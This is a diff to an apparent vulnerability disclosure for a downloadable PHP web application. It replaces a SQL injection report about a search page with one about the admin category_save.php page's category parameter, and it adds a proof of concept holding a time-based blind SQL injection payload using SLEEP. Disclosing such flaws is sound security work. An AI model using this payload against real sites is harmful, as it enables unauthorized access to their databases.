@@ -14,7 +14,14 @@ Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altons
 
 # Description
 
-The rcode parameter can be passed in for querying on the "search.chp" page, but due to the code's lax filtering of this parameter, it can lead to SQL injection.
-<img width="1098" alt="image" src="https://github.com/user-attachments/assets/aa5fce7c-660e-441c-a3d0-42f00c93639f">
+Log in as an administrator user, access the "/admin/category_save. php" page, and pass in the category parameter. Due to lax filtering, this parameter can lead to SQL injection vulnerabilities.
+<img width="1078" alt="image" src="https://github.com/user-attachments/assets/b24aea4e-41f2-49fa-98db-f3530ae978d9">
 
 # Poc
+
+```
+Parameter: category (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category=1' AND (SELECT 4315 FROM (SELECT(SLEEP(5)))UBMb) AND 'gUvK'='gUvK
+```
